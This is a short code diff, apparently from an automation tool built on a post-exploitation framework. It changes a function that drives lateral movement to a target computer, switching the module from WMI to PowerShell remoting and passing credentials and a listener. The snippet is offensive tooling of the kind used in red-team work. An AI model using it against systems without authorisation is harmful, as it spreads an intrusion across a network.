@@ -2,7 +2,7 @@ async def crystallize(
     agent, computer_name, username="", password="", listener="DeathStar"
 ):
     output = await agent.execute(
-        "powershell/lateral_movement/invoke_wmi",
+        "powershell/lateral_movement/invoke_psremoting",
         options={
             "ComputerName": computer_name,
             "Listener": listener,
